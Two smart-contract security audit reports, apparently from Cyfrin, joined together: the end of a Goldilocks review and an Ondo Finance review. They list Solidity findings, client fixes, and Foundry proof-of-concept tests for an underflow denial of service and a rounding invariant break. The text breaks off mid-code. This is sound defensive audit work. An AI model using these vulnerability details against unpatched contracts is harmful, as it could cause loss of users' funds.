### `Goldilocked._lockedLocks()` should round up.

**Description:** Users might borrow 1 more wei as it rounds down.
```solidity
  function _lockedLocks(address user) internal view returns (uint256) {
    return FixedPointMathLib.divWad(borrowedHoney[user], IGoldiswap(goldiswap).floorPrice());//@audit round up
  }
```
**Client:** Fixed in [PR #15](https://github.com/0xgeeb/goldilocks-core/pull/15)

**Cyfrin:** Verified.

### Possible failure to redeem

**Description:** In `Goldivault`, `redeemOwnership()` wouldn't work as expected after calling `changeProtocolParameters/initializeProtocol()` because `endTime/duration` is changed.

**Client:** Acknowledged, we plan to only call changeProtocolParameters after vault has concluded and ownership token holders have had chance to redeem. We will announce that we are going to update parameters and renew.

**Cyfrin:** Acknowledged.

### Inconsistent comparison while checking `eta`

**Description:** In `Goldigovernor` and `Timelock`, inconsistent comparisons are used.

```solidity
File: Goldigovernor.sol
386:     else if (block.timestamp >= proposal.eta + Timelock(timelock).GRACE_PERIOD()) {
387:       return ProposalState.Expired;
388:     }

File: Timelock.sol
138:     if(block.timestamp > eta + GRACE_PERIOD) revert TxStale();
```
**Client:** Fixed in [PR #6](https://github.com/0xgeeb/goldilocks-core/pull/6)

**Cyfrin:** Verified.

### Wrong comment

**Description:**
```solidity
File: Timelock.sol
49:   /// @notice Delay for queueing a transaction in blocks //@audit seconds, not blocks
60:   /// @param _delay Delay the timelock will use, in blocks //@audit seconds, not blocks
103:   /// @param eta Duration of time until transaction can be executed, in blocks //@audit seconds, not blocks
123:   /// @param eta Duration of time until transaction can be executed, in blocks //@audit seconds, not blocks
154:   /// @param eta Duration of time until transaction can be executed, in blocks //@audit seconds, not blocks

File: Goldilend.sol
496:   /// @notice Calculates claimable Porridge per GiBGT //@audit claimable reward token
608:   /// @dev Claims existing vault rewards and updates poolSize //@audit this function doesn't update poolSize
```
**Client:** Fixed in [PR #16](https://github.com/0xgeeb/goldilocks-core/pull/16)

**Cyfrin:** Verified.

### Missing bracket in docs

**Description:** [The document](https://goldilocks-1.gitbook.io/goldidocs/locks/the-price-function) is missing a bracket.
```diff
- Market price = Floor Price + ((PSL/Supply)*(FSL+PSL/FSL)^6)
+ Market price = Floor Price + (PSL/Supply)*((FSL+PSL)/FSL)^6
```

**Client:** Acknowledged, this has been corrected.

**Cyfrin:** Acknowledged.

### Rounding loss of 1 wei

**Description:** In `Goldivault`, sum of 2 amounts might be less than `amount` due to the rounding loss.

```solidity
File: Goldivault.sol
159:     if(remainingTime > 0) {
160:       SafeTransferLib.safeTransfer(depositToken, msg.sender, amount * (1000 - _fee) / 1000);
161:       SafeTransferLib.safeTransfer(depositToken, multisig, amount * _fee / 1000); //@audit rounding loss
162:       emit OwnershipTokenRedemption(msg.sender, amount * (1000 - _fee) / 1000);
163:     }

File: Goldilend.sol
430:     poolSize += userLoan.interest * (1000 - (multisigShare + apdaoShare)) / 1000;
431:     _updateInterestClaims(interest); //@audit rounding loss
...
694:   function _updateInterestClaims(uint256 interest) internal {
695:     multisigClaims += interest * multisigShare / 1000;
696:     apdaoClaims += interest * apdaoShare / 1000;
697:   }
```

**Client:** Fixed in [PR #17](https://github.com/0xgeeb/goldilocks-core/pull/17)

**Cyfrin:** Verified.

## Informational


### Unused constant

```solidity
File: Goldigovernor.sol
102:   /// @notice Amount of votes to reach quorum
103:   uint256 public constant quorumVotes = 9_500_000e18; // 5% of LOCKS
```



### Bad design to pull `HONEY` twice from the user

Users should approve the transfer twice during the interaction. It would be better to pull the whole amount from the user at a time and transfer to `multisig` from the contract.

```solidity
File: Goldiswap.sol
149:     SafeTransferLib.safeTransferFrom(honey, msg.sender, address(this), price);
150:     SafeTransferLib.safeTransferFrom(honey, msg.sender, multisig, tax);
```

## Gas Optimization


### Constructors can be marked as `payable`.

Payable functions cost less gas to execute, since the compiler does not have to add extra checks to ensure that a payment wasn't provided. A constructor can safely be marked as `payable`, since only the deployer would be able to pass funds, and the project itself would not pass any funds. (9 Instances)



### Nesting `if`-statements is cheaper than using `andand`.

Nesting `if`-statements avoids the stack operations of setting up and using an extra jumpdest, and saves 6 gas.

```solidity
File: GovLocks.sol
214:     if (srcRep != dstRep && amt > 0) {
237:     if (nCheckpoints > 0 && checkpoints[delegatee][nCheckpoints - 1].fromBlock == block.number) {
266:     if(from != address(0) && to != address(0)) {

File: Goldilend.sol
536:     return _poolSize > 0 && supply > 0 ? FixedPointMathLib.mulWad(lockAmount, _GiBGTRatio(supply, _poolSize)) : lockAmount;

File: Goldiswap.sol
329:     if (elapsedIncrease >= 1 days && elapsedDecrease >= 1 days) {
```



### Use `uint256(1)/uint256(2)` instead of `true/false` to save gas for changes.

Avoids 20000 gas when changing from `false` to `true`, after having been true in the past.

```solidity
File: Goldilend.sol
107:   bool public borrowingActive;

File: Goldivault.sol
91:   bool public concluded;
```



### Augmented assignment operator costs more gas than normal addition for state variables.

Normal addition operation (`x=x+y`) costs less gas than augmented assignment operator (`x+=y`) for state variables (113 gas). (34 instances)


### Cache array length outside of loops and consider unchecked loop incrementing.

```solidity
File: Goldilend.sol
251:   function boost(
252:     address[] calldata partnerNFTs,
253:     uint256[] calldata partnerNFTIds
254:   ) external {
255:     for(uint256 i; i < partnerNFTs.length; i++) {
256:       if(partnerNFTBoosts[partnerNFTs[i]] == 0) revert InvalidBoostNFT();
257:     }
258:     if(partnerNFTs.length != partnerNFTIds.length) revert ArrayMismatch();
259:     boosts[msg.sender] = _buildBoost(partnerNFTs, partnerNFTIds);
260:     for(uint8 i; i < partnerNFTs.length; i++) {
261:       IERC721(partnerNFTs[i]).safeTransferFrom(msg.sender, address(this), partnerNFTIds[i]);
262:     }
263:   }
```

\clearpage

------ FILE END car/reports_md/2024-04-14-cyfrin-goldilocks-v1.1.md ------


------ FILE START car/reports_md/2024-04-18-cyfrin-ondo-finance.md ------

**Lead Auditors**

[Dacian](https://twitter.com/DevDacian)
**Assisting Auditors**



---

# Findings
## Low Risk


### `InvestorBasedRateLimiter::setInvestorMintLimit` and `setInvestorRedemptionLimit` can make subsequent calls to `checkAndUpdateMintLimit` and `checkAndUpdateRedemptionLimit` revert due to underflow

**Description:** `InvestorBasedRateLimiter::_checkAndUpdateRateLimitState` [L211-213](https://github.com/ondoprotocol/rwa-internal/blob/6747ebada1c867a668a8da917aaaa7a0639a5b7a/contracts/ousg/InvestorBasedRateLimiter.sol#L211-L213) subtracts the current mint/redemption amount from the corresponding limit:
```solidity
if (amount > rateLimit.limit - rateLimit.currentAmount) {
  revert RateLimitExceeded();
}
```

If `setInvestorMintLimit` or `setInvestorRedemptionLimit` are used to set the limit amount for minting or redemptions smaller than the current mint/redemption amount, calls to this function will revert due to underflow.

**Impact:** `InvestorBasedRateLimiter::setInvestorMintLimit` and `setInvestorRedemptionLimit` can make subsequent calls to `checkAndUpdateMintLimit` and `checkAndUpdateRedemptionLimit` revert due to underflow.

**Proof of Concept:** Add this drop-in PoC to `forge-tests/ousg/InvestorBasedRateLimiter/setters.t.sol`:
```solidity
function test_setInvestorMintLimit_underflow_DoS() public initDefault(alice) {
    // first perform a mint
    uint256 mintAmount = rateLimiter.defaultMintLimit();
    vm.prank(client);
    rateLimiter.checkAndUpdateMintLimit(alice, mintAmount);

    // admin now reduces the mint limit to be under the current
    // minted amount
    uint256 aliceInvestorId = 1;
    uint256 newMintLimit = mintAmount - 1;
    vm.prank(guardian);
    rateLimiter.setInvestorMintLimit(aliceInvestorId, newMintLimit);

    // subsequent calls to `checkAndUpdateMintLimit` revert due to underflow
    vm.prank(client);
    rateLimiter.checkAndUpdateMintLimit(alice, 1);

    // same issue affects `setInvestorRedemptionLimit`
}
```

Run with: `forge test --match-test test_setInvestorMintLimit_underflow_DoS`

Produces output:
```
Ran 1 test for forge-tests/ousg/InvestorBasedRateLimiter/setters.t.sol:Test_InvestorBasedRateLimiter_setters_ETH
[FAIL. Reason: panic: arithmetic underflow or overflow (0x11)] test_setInvestorMintLimit_underflow_DoS() (gas: 264384)
Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.09ms (116.74s CPU time)
```

**Recommended Mitigation:** Explicitly handle the case where the limit is smaller than the current mint/redemption amount:
```solidity
if (rateLimit.limit <= rateLimit.currentAmount || amount > rateLimit.limit - rateLimit.currentAmount) {
  revert RateLimitExceeded();
}
```

**Ondo:**
Fixed in commit [fb8ecff](https://github.com/ondoprotocol/rwa-internal/commit/fb8ecff80960c8c891ddc206c6f6f27a620e42d6).

**Cyfrin:** Verified.


### Prevent creating an investor record associated with the zero address

**Description:** `InvestorBasedRateLimiter::checkAndUpdateMintLimit` and `checkAndUpdateRedemptionLimit` can create a new investor record and associate it with the zero address.

**Impact:** Investor records can be created which are associated with the zero address. This breaks the following invariant of the `InvestorBasedRateLimiter` contract:

> when a new `investorId` is created, it should be associated with one or more valid addresses

**Proof of Concept:** Add this drop-in PoC to `forge-tests/ousg/InvestorBasedRateLimiter/client.t.sol`:
```solidity
function test_mint_zero_address() public {
    uint256 mintAmount = rateLimiter.defaultMintLimit();
    vm.prank(client);
    rateLimiter.checkAndUpdateMintLimit(address(0), mintAmount);

    // an investor has been created with a 0 address
    assertEq(1, rateLimiter.addressToInvestorId(address(0)));

    // same issue affects checkAndUpdateRedemptionLimit
}
```

Run with: `forge test --match-test test_mint_zero_address`

**Recommended Mitigation:** In `_setAddressToInvestorId` revert for the zero address:
```solidity
function _setAddressToInvestorId(
    address investorAddress,
    uint256 newInvestorId
) internal {
    if(investorAddress == address(0)) revert NoZeroAddress();
```

**Ondo:**
Fixed in commit [bac99d0](https://github.com/ondoprotocol/rwa-internal/commit/bac99d03d75e84ea5541297b3aa0751283c1272e).

**Cyfrin:** Verified.


### Prevent creating an investor record associated with no address

**Description:** `InvestorBasedRateLimiter::initializeInvestorStateDefault` is supposed to associate a newly created investor with one or more addresses but the `for` [loop](https://github.com/ondoprotocol/rwa-internal/blob/6747ebada1c867a668a8da917aaaa7a0639a5b7a/contracts/ousg/InvestorBasedRateLimiter.sol#L253-L260) which does this can be bypassed by calling the function with an empty array:
```solidity
function initializeInvestorStateDefault(
    address[] memory addresses
    ) external onlyRole(CONFIGURER_ROLE) {
    _initializeInvestorState(
      addresses,
      defaultMintLimit,
      defaultRedemptionLimit,
      defaultMintLimitDuration,
      defaultRedemptionLimitDuration
    );
}

function _initializeInvestorState(
    address[] memory addresses,
    uint256 mintLimit,
    uint256 redemptionLimit,
    uint256 mintLimitDuration,
    uint256 redemptionLimitDuration
    ) internal {
    uint256 investorId = ++investorIdCounter;

    // @audit this `for` loop can by bypassed by calling
    // `initializeInvestorStateDefault` with an empty array
    for (uint256 i = 0; i < addresses.length; ++i) {
      // Safety check to ensure the address is not already associated with an investor
      // before associating it with a new investor
      if (addressToInvestorId[addresses[i]] != 0) {
        revert AddressAlreadyAssociated();
      }
      _setAddressToInvestorId(addresses[i], investorId);
    }

    investorIdToMintState[investorId] = RateLimit({
      currentAmount: 0,
      limit: mintLimit,
      lastResetTime: block.timestamp,
      limitDuration: mintLimitDuration
    });
    investorIdToRedemptionState[investorId] = RateLimit({
      currentAmount: 0,
      limit: redemptionLimit,
      lastResetTime: block.timestamp,
      limitDuration: redemptionLimitDuration
    });
}
```

**Impact:** An investor record can be created without any associated address. This breaks the following invariant of the `InvestorBasedRateLimiter` contract:

> when a new `investorId` is created, it should be associated with one or more valid addresses

**Proof of Concept:** Add this drop-in PoC to `forge-tests/ousg/InvestorBasedRateLimiter/setters.t.sol`:
```solidity
function test_initializeInvestor_NoAddress() public {
    // no investor created
    assertEq(0, rateLimiter.investorIdCounter());

    // empty input array will bypass the `for` loop that is supposed
    // to associate addresses to the newly created investor
    address[] memory addresses;

    vm.prank(guardian);
    rateLimiter.initializeInvestorStateDefault(addresses);

    // one investor created
    assertEq(1, rateLimiter.investorIdCounter());

    // not associated with any addresses
    assertEq(0, rateLimiter.investorAddressCount(1));
}
```

Run with: `forge test --match-test test_initializeInvestor_NoAddress`

**Recommended Mitigation:** In `_initializeInvestorState` revert if the input address array is empty:
```solidity
uint256 addressesLength = addresses.length;

if(addressesLength == 0) revert EmptyAddressArray();
```

**Ondo:**
Fixed in commit [bac99d0](https://github.com/ondoprotocol/rwa-internal/commit/bac99d03d75e84ea5541297b3aa0751283c1272e).

**Cyfrin:** Verified.


### `InstantMintTimeBasedRateLimiter::_setInstantMintLimit` and `_setInstantRedemptionLimit` can make subsequent calls to `_checkAndUpdateInstantMintLimit` and `_checkAndUpdateInstantRedemptionLimit` revert due to underflow

**Description:** `InstantMintTimeBasedRateLimiter::_checkAndUpdateInstantMintLimit` [L103-106](https://github.com/ondoprotocol/rwa-internal/blob/6747ebada1c867a668a8da917aaaa7a0639a5b7a/contracts/InstantMintTimeBasedRateLimiter.sol#L103-L106) subtracts the currently minted amount from the mint limit:
```solidity
require(
  amount <= instantMintLimit - currentInstantMintAmount,
  "RateLimit: Mint exceeds rate limit"
);
```

If `_setInstantMintLimit` is used to set `instantMintLimit < currentInstantMintAmount`, subsequent calls to this function will revert due the underflow. The same is true for `_setInstantRedemptionLimit` and `_checkAndUpdateInstantRedemptionLimit`.

**Impact:** `InstantMintTimeBasedRateLimiter::_setInstantMintLimit` and `_setInstantRedemptionLimit` can make subsequent calls to `_checkAndUpdateInstantMintLimit` and `_checkAndUpdateInstantRedemptionLimit` revert due to underflow.

**Recommended Mitigation:** Explicitly handle the case where the limit is smaller than the current mint/redemption amount:
```solidity
function _checkAndUpdateInstantMintLimit(uint256 amount) internal {
    require(
      instantMintLimit > currentInstantMintAmount && amount <= instantMintLimit - currentInstantMintAmount,
      "RateLimit: Mint exceeds rate limit"
    );
}

function _checkAndUpdateInstantRedemptionLimit(uint256 amount) internal {
    require(
      instantRedemptionLimit > currentInstantRedemptionAmount && amount <= instantRedemptionLimit - currentInstantRedemptionAmount,
      "RateLimit: Redemption exceeds rate limit"
    );
}
```

**Ondo:**
Fixed in commit [fb8ecff](https://github.com/ondoprotocol/rwa-internal/commit/fb8ecff80960c8c891ddc206c6f6f27a620e42d6).

**Cyfrin:** Verified.


### `OUSGInstantManager` redemptions will be bricked if BlackRock deploys a new `BUIDLRedeemer` contract and sunsets the existing one

**Description:** The `BUIDLRedeemer` contract is a very new contract; it is very possible that in the future a new version of the contract will be deployed and the current version will cease to function.

To future-proof `OUSGInstantManager` and ensure it will continue to function in this situation, remove the `immutable` keyword from the `buidlRedeemer` definition and add a setter function that allows it to be updated in the future.

**Ondo:**
If a new `BUIDLRedeemer` contract is deployed our plan is to deploy a new `OUSGInstantManager`. We prefer to make it harder for us to change the address of `buidlRedeemer` to ensure there is proper due diligence of any changes.


### `ROUSG::unwrap` can unnecessarily return slightly less `OUSG` tokens than users originally wrapped

**Description:** One invariant of the `ROUSG` token is:

> when unwrapping users should receive the same amount of OUSG input tokens they provided when they wrapped, irrespective of price

However this can often not be the case as `ROUSG::unwrap` can unnecessarily return slightly less `OUSG` tokens than users originally wrapped.

**Impact:** Users will unnecessarily receive slightly less tokens than they originally wrapped, breaking an invariant of the `ROUSG` contract.

**Proof of Concept:** Run this stand-alone stateless fuzz test which shows the problem:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";

// run from base project directory with:
// forge test --match-contract ROUSGWrapUnwrapBrokenInvariantTest -vvv

contract ROUSGWrapUnwrapBrokenInvariantTest is Test {

    uint256 public constant OUSG_TO_ROUSG_SHARES_MULTIPLIER = 10_000;

    function _getROUSGByShares(uint256 _shares, uint256 ousgPrice) internal pure returns (uint256 rOUSGAmount) {
        rOUSGAmount = (_shares * ousgPrice) / (1e18 * OUSG_TO_ROUSG_SHARES_MULTIPLIER);
    }

    function getSharesByROUSG(uint256 _rOUSGAmount, uint256 ousgPrice)
    internal pure returns (uint256 shares) {
        shares = (_rOUSGAmount * 1e18 * OUSG_TO_ROUSG_SHARES_MULTIPLIER) / ousgPrice;
    }

    function _wrap(uint256 _OUSGAmount) internal pure returns (uint256 shares) {
        require(_OUSGAmount > 0, "rOUSG: can't wrap zero OUSG tokens");

        shares = _OUSGAmount * OUSG_TO_ROUSG_SHARES_MULTIPLIER;
    }

    function _unwrap(uint256 _rOUSGAmount, uint256 ousgPrice) internal pure returns(uint256 tokens) {
        require(_rOUSGAmount > 0, "rOUSG: can't unwrap zero rOUSG tokens");

        uint256 ousgSharesAmount = getSharesByROUSG(_rOUSGAmount, ousgPrice);

        vm.assume(ousgSharesAmount >= OUSG_TO_ROUSG_SHARES_MULTIPLIER);

        tokens = ousgSharesAmount / OUSG_TO_ROUSG_SHARES_MULTIPLIER;
    }

    function test_WrapUnwrapReturnsInputTokens(uint256 initialOUSGAmount, uint256 ousgPrice) external {
        // bound inputs
        initialOUSGAmount  = bound(initialOUSGAmount, 100000e18, type(uint128).max);
        ousgPrice          = bound(ousgPrice, 105e18, 106e18);

        // wrap OUSG into rOUSG
        uint256 rousgShares = _wrap(initialOUSGAmount);

        // get the token amount of rOUSG equivalent to the received shares
        uint256 rousgAmount = _getROUSGByShares(rousgShares, ousgPrice);

        // use the token amount to unwrap rOUSG back into OUSG
        uint256 finalOUSGAmount = _unwrap(rousgAmount, ousgPrice);

        // verify amounts match; this fails as user is slighty short-changed
        assertEq(initialOUSGAmount, finalOUSGAmount);
    }
}
```

**Recommended Mitigation:** When calling `ROUSG::unwrap`, `burn` and `OUSGInstantManager::redeemRebasingOUSG`, instead of passing in the `ROUSG` token amount the callers should pass in the share amount which can be retrieved via `ROUSG::sharesOf`. The output token calculation can then be performed as `shares / OUSG_TO_ROUSG_SHARES_MULTIPLIER` which will always return the correct amount of tokens.

The existing functions do not necessarily need to be removed but additional functions should be created to allow users to input the share amounts. The following function has been tested via an invariant fuzz testing suite and appears to always return the correct amount:
```solidity
  // @audit this function allow unwrapping by shares instead of tokens
  // to prevent users being slightly short-changed such that users will
  // always receive the same input amount of OUSG tokens
  function unwrapShares(uint256 _shares) external whenNotPaused {
    uint256 ousgTokens = _shares / OUSG_TO_ROUSG_SHARES_MULTIPLIER;

    require(ousgTokens > 0, "rOUSG: no tokens to send, unwrap more shares");

    uint256 rousgBurned = getROUSGByShares(_shares);

    _burnShares(msg.sender, _shares);
    ousg.transfer(msg.sender, ousgTokens);

    emit Transfer(msg.sender, address(0), rousgBurned);
    emit TransferShares(msg.sender, address(0), _shares);
  }
```

Proof that this mitigation works, using a modified version of the PoC stateless fuzz test:

First ensure that `foundry.toml` has the fuzz setting increased for example:
```
[fuzz]
runs = 1000000
```

Then run this stand-alone stateless fuzz test which verifies the solution:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";

// run from base project directory with:
// forge test --match-contract ROUSGWrapUnwrapFixedInvariantTest -vvv

contract ROUSGWrapUnwrapFixedInvariantTest is Test {

    uint256 public constant OUSG_TO_ROUSG_SHARES_MULTIPLIER = 10_000;

    function _wrap(uint256 _OUSGAmount) internal pure returns (uint256 shares) {
        require(_OUSGAmount > 0, "rOUSG: can't wrap zero OUSG tokens");

        shares = _OUSGAmount * OUSG_TO_ROUSG_SHARES_MULTIPLIER;
    }

    function _unwrapShares(uint256 shares) internal pure returns(uint256 tokens) {
        tokens = shares / OUSG_TO_ROUSG_SHARES_MULTIPLIER;
    }

    function test_WrapUnwrapReturnsInputTokens(uint256 initialOUSGAmount, uint256 ousgPrice) external {
        // bound inputs
        initialOUSGAmount  = bound(initialOUSGAmount, 100000e18, type(uint128).max);
        ousgPrice          = bound(ousgPrice, 105e18, 106e18);

        // wrap OUSG into rOUSG
        uint256 rousgShares = _wrap(initialOUSGAmount);

        // use the token amount to unwrap rOUSG back into OUSG
        uint256 finalOUSGAmount = _unwrapShares(rousgShares);

        assertEq(initialOUSGAmount, finalOUSGAmount);
    }
}
```

**Ondo:**
Fixed in commits [df0e491](https://github.com/ondoprotocol/rwa-internal/commit/df0e491fb081f4b7cd0d7329f8763e644ea77c18), [2aa437a](https://github.com/ondoprotocol/rwa-internal/commit/2aa437aa78435fc4533c3a9d223460da34e71647). We decided on not making any changes to `OUSGInstantManager` due to the amount of code changes necessary.

**Cyfrin:** Verified.


### Protocol may be short-changed by `BuidlRedeemer` during a USDC depeg event

**Description:** `OUSGInstantManager::_redeemBUIDL` assumes that 1 BUIDL = 1 USDC as it [enforces](https://github.com/ondoprotocol/rwa-internal/blob/6747ebada1c867a668a8da917aaaa7a0639a5b7a/contracts/ousg/ousgInstantManager.sol#L453-L459) receiving 1 USDC for every 1 BUIDL it redeems:
```solidity
uint256 usdcBalanceBefore = usdc.balanceOf(address(this));
buidl.approve(address(buidlRedeemer), buidlAmountToRedeem);
buidlRedeemer.redeem(buidlAmountToRedeem);
require(
  usdc.balanceOf(address(this)) == usdcBalanceBefore + buidlAmountToRedeem,
  "OUSGInstantManager::_redeemBUIDL: BUIDL:USDC not 1:1"
);
```
In the event of a USDC depeg (especially if the depeg is sustained), `BUIDLRedeemer` should return greater than a 1:1 ratio since 1 USDC would not be worth $1, hence 1 BUIDL != 1 USDC meaning the value of the protocol's BUIDL is worth more USDC. However `BUIDLReceiver` does not do this, it only ever [returns](https://etherscan.io/address/0x9ba14Ce55d7a508A9bB7D50224f0EB91745744b7#code) 1:1.

**Impact:** In the event of a USDC depeg the protocol will be short-changed by `BuidlRedeemer` since it will happily receive only 1 USDC for every 1 BUIDL redeemed, even though the value of 1 BUIDL would be greater than the value of 1 USDC due to the USDC depeg.

**Recommended Mitigation:** To prevent this situation the protocol would need to use an oracle to check whether USDC had depegged and if so, calculate the amount of USDC it should receive in exchange for its BUIDL. If it is short-changed it would either have to revert preventing redemptions or allow the redemption while saving the short-changed amount to storage then implement an off-chain process with BlackRock to receive the short-changed amount.

Alternatively the protocol may simply accept this as a risk to the protocol that it will be willingly short-changed during a USDC depeg in order to allow redemptions to continue.

**Ondo:**
Fixed in commits [408bff1](https://github.com/ondoprotocol/rwa-internal/commit/408bff112c39f393f67dde6c30a6addf3b221ee9), [8a9cae9](https://github.com/ondoprotocol/rwa-internal/commit/8a9cae9af5787f06db42b4224b147d60493e0133). We now use Chainlink USDC/USD Oracle and if USDC depegs below our tolerated minimum value both minting and redemptions will be stopped.

**Cyfrin:** Verified.

\clearpage
## Informational


### Consider implementing unlimited approvals for `rOUSG` token

**Description:** ERC20 tokens commonly implement unlimited approvals by allowing users to approve spenders for `type(uint256).max`. Consider implementing this common feature; an [example](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L301-L311) from OpenZeppelin.

**Ondo:**
Acknowledged.


### Reduce approval before transferring tokens in `rOUSG::transferFrom`

**Description:** `rOUSG::transferFrom` [L286-289](https://github.com/ondoprotocol/rwa-internal/blob/6747ebada1c867a668a8da917aaaa7a0639a5b7a/contracts/ousg/rOUSG.sol#L286-L289) currently checks approvals, transfers the tokens then reduces the approvals:
```solidity
// verify approval
require(currentAllowance >= _amount, "TRANSFER_AMOUNT_EXCEEDS_ALLOWANCE");

// perform transfer
_transfer(_sender, _recipient, _amount);

// reduce approval
_approve(_sender, msg.sender, currentAllowance - _amount);
```

A safer coding pattern is to reduce the approval first then transfer tokens similar to OpenZeppelin's [impementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L151-L152).

**Ondo:**
Acknowledged.


### Transfer tokens before minting shares in `rOUSG::wrap`

**Description:** `rOUSG::wrap` [L411-413](https://github.com/ondoprotocol/rwa-internal/blob/6747ebada1c867a668a8da917aaaa7a0639a5b7a/contracts/ousg/rOUSG.sol#L411-L413) currently mints shares before transferring tokens used to mint those shares:
```solidity
// mint shares
uint256 ousgSharesAmount = _OUSGAmount * OUSG_TO_ROUSG_SHARES_MULTIPLIER;
_mintShares(msg.sender, ousgSharesAmount);

// transfer tokens used to mint the shares
ousg.transferFrom(msg.sender, address(this), _OUSGAmount);
```
A safer coding pattern is to transfer the tokens first then mint the shares.

**Ondo:**
Acknowledged.


### Round up fees in `OUSGInstantManager::_getInstantMintFees` and `_getInstantRedemptionFees` to favor the protocol

**Description:** Solidity rounds down by default so consider explicitly rounding up fees in `OUSGInstantManager::_getInstantMintFees` and `_getInstantRedemptionFees` to favor the protocol.

**Ondo:**
Acknowledged.


### Misleading events are emitted when transferring a dust amount of rOUSG shares

**Description:** Calling `ROUSG.transferShares` emits two events:

`TransferShares`: How much rOUSG shares were transferred
`Transfer`: How much rOUSG tokens were transferred

Calling this function with a dust amount will emit an event that a non-zero amount of shares was transferred, together with an event that zero tokens were transferred as the `getROUSGByShares` will round to 0.

**Ondo:**
Acknowledged.


### Consider allowing `ROUSG::burn` to burn dust amounts

**Description:** `ROUSG::burn` is used by admins to burn `rOUSG` tokens from any account for regulatory reasons.

It does not allow burning a share amount smaller than 1e4, because this is less than a wei of `OUSG`.

```solidity
if (ousgSharesAmount < OUSG_TO_ROUSG_SHARES_MULTIPLIER)
      revert UnwrapTooSmall();
```

Depending on the current and future regulatory situation it could be necessary to always be able to burn all shares from users.

**Recommended Mitigation:** Consider allowing the `burn` function to burn all remaining shares even if under the minimum amount.

**Ondo:**
Fixed in commit [2aa437a](https://github.com/ondoprotocol/rwa-internal/commit/2aa437aa78435fc4533c3a9d223460da34e71647).

**Cyfrin:** Verified.


### `_assertUSDCPrice` breaks the solidity style guide

**Description:** The `_assertUSDCPrice` function is public and starts with an underscore. According to the [solidity style guide](https://docs.soliditylang.org/en/latest/style-guide.html), this convention is suggested for non-external functions and state variables (private or internal).

**Recommended Mitigation:** Remove the `_`, or change the visibility of the function.

**Ondo:**
Fixed in commit [fc1c8fb](https://github.com/ondoprotocol/rwa-internal/commit/fc1c8fbd9efb77d4307611d83d7350d869a23e22).

**Cyfrin:** Verified.

\clearpage
## Gas Optimization


### Cache array length outside of loops and consider unchecked loop incrementing

**Description:** Cache array length outside of loops and consider using `unchecked {++i;}` if not compiling with `solc --ir-optimized --optimize`:
```solidity
File: contracts/ousg/InvestorBasedRateLimiter.sol

253:     for (uint256 i = 0; i < addresses.length; ++i) {
```

```solidity
File: contracts/ousg/ousgInstantManager.sol

881:     for (uint256 i = 0; i < exCallData.length; ++i) {
```

**Ondo:**
Acknowledged.


### Cache storage variables in stack when read multiple times without being changed

**Description:** Reading from storage is considerably more expensive than reading from the stack so cache storage variables when read multiple times without being changed:

```solidity
File: contracts/ousg/InvestorBasedRateLimiter.sol

// @audit cache these then use cache values when emitting event to save 2 storage reads
324:      --investorAddressCount[previousInvestorId];
335:      ++investorAddressCount[newInvestorId];

// @audit cache and use cached value for check in L470 to save 1 storage read
462:    if (mintState.lastResetTime == 0) {

// @audit cache and use cached value for check in L506 to save 1 storage read
498:    if (redemptionState.lastResetTime == 0) {
```

**Ondo:**
Acknowledged.


### Avoid unnecessary initialization to zero

**Description:** Avoid unnecessary initialization to zero:
```solidity
File: contracts/ousg/InvestorBasedRateLimiter.sol

253:     for (uint256 i = 0; i < addresses.length; ++i) {
```

```solidity
File: contracts/ousg/ousgInstantManager.sol

106:   uint256 public mintFee = 0;

109:   uint256 public redeemFee = 0;

881:     for (uint256 i = 0; i < exCallData.length; ++i) {
```

**Ondo:**
Fixed in commit [a7dab64](https://github.com/ondoprotocol/rwa-internal/commit/a7dab64a2ad87b6ca051c3aeb5371c8f9f933350).

**Cyfrin:** Verified.


### `InvestorBasedRateLimiter::_initializeInvestorState` should return newly created `investorId` to save re-reading it from storage

**Description:** `InvestorBasedRateLimiter::_initializeInvestorState` should return the newly created `investorId`; this can then be used inside `checkAndUpdateMintLimit` and `checkAndUpdateRedemptionLimit` to save 1 storage read in each function. For example take `checkAndUpdateMintLimit`:
```solidity
      _initializeInvestorState(
        addresses,
        defaultMintLimit,
        defaultRedemptionLimit,
        defaultMintLimitDuration,
        defaultRedemptionLimitDuration
      );

      // @audit GAS - save 1 storage read by having _initializeInvestorState
      // return the new `investorId`
      investorId = addressToInvestorId[investorAddress];
```

This can simply become:
```solidity
investorId = _initializeInvestorState(
        addresses,
        defaultMintLimit,
        defaultRedemptionLimit,
        defaultMintLimitDuration,
        defaultRedemptionLimitDuration
      );
```

**Ondo:**
Fixed in commit [192c7ca](https://github.com/ondoprotocol/rwa-internal/commit/192c7ca26e4aeab4c322ef6c4be0f39b5be5d34d).

**Cyfrin:** Verified.


### Refactor `InvestorBasedRateLimiter::checkAndUpdateMintLimit` and `checkAndUpdateRedemptionLimit` to avoid performing unnecessary operations when creating a new investor

**Description:** When creating a new investor inside `InvestorBasedRateLimiter::checkAndUpdateMintLimit` and `checkAndUpdateRedemptionLimit` there is no need to do a lot of the current processing that occurs after the second `if` statement. A more optimized version could look like this:

```solidity
  function checkAndUpdateMintLimitOptimized(
    address investorAddress,
    uint256 mintAmount
  ) external override onlyRole(CLIENT_ROLE) {
    if (mintAmount == 0) {
      revert InvalidAmount();
    }

    uint256 investorId = addressToInvestorId[investorAddress];

    if (investorId == 0) {
      // @audit GAS - for new investor, revert if `mintAmount > defaultMintLimit`
      // otherwise execute next code then update investorIdToMintState[investorId].currentAmount
      // and slightly change emitted event since prevAmount = 0
      uint256 defaultMintLimitCache = defaultMintLimit;

      if(mintAmount > defaultMintLimitCache) revert RateLimitExceeded();

      // If this is a new investor, initialize their state with the default values
      address[] memory addresses = new address[](1);
      addresses[0] = investorAddress;

      // @audit GAS - return new investorId from `_initializeInvestorState`
      investorId = _initializeInvestorState(
        addresses,
        defaultMintLimit,
        defaultRedemptionLimit,
        defaultMintLimitDuration,
        defaultRedemptionLimitDuration
      );

      // @audit now update current minted amount
      investorIdToMintState[investorId].currentAmount = mintAmount;

      // @audit and alter emitted event to reflect first mint for this new investor
      emit MintStateUpdated(
        investorAddress,
        investorId,
        0,
        mintAmount,
        defaultMintLimitCache - mintAmount
      );
    }
    else {
      // @audit GAS - wrap remaining code in an `else` to only
